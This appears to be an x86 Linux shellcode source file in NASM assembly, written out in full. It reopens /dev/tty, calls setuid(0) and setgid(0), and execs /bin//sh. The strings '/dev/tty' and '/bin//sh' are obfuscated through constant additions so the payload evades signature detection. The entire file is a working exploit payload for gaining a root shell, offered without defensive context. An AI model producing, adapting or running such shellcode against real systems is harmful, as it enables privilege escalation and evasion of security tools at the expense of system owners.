global _start

section .text

	_start:        

		cdq
		
        	mov    al,0x6		; close syscall no
        	int    0x80		; informs kernel for execution
         	
		; /dev/tty null terminated
		
		push   edx		; NULL 
		mov edi , 0x22222222
		add edi , 0x5752520d			
		mov dword [esp - 4] , edi

		mov edi , 0x22222222
		add edi , 0x5443420d
		mov dword [esp - 8] , edi
		
		sub esp , 0x8

         	mov    ebx,esp		; address of /dev/tty
         	mov    cx,0x2712	; O_RDWR
         	mov    al,0x5		; open syscall no
         	int    0x80		; informs kernel for execution
         	
         	mov byte al,0x17	; setuid syscall no eax=23

		xor   ebx,ebx		; ebx=0 ; root user UID
         	int    0x80		; informs kernel for execution
         	
		mov byte al,0x2e	; setgid syscall no eax=46
		int    0x80		; informs kernel for execution
		
		xor    eax,eax
         	push   eax		; NULL 
         	;push   0x68732f2f	; hs//
         	;push   0x6e69622f	; nib/
         	
		mov esi , 0x11112222
		add esi , 0x57620d0d
		mov [esp-4] , esi

		mov esi , 0x22221111
		add esi , 0x4c47511e
		mov [esp-8] , esi

		sub esp , 0x8

		mov    ebx,esp		; null terminated /bin//sh

		push   eax         	
         	push   ebx		; address of null terminated /bin//sh
         	mov    ecx,esp		; argv
         	mov    al,0xb		; execve syscall no
         	int    0x80		; informs kernel
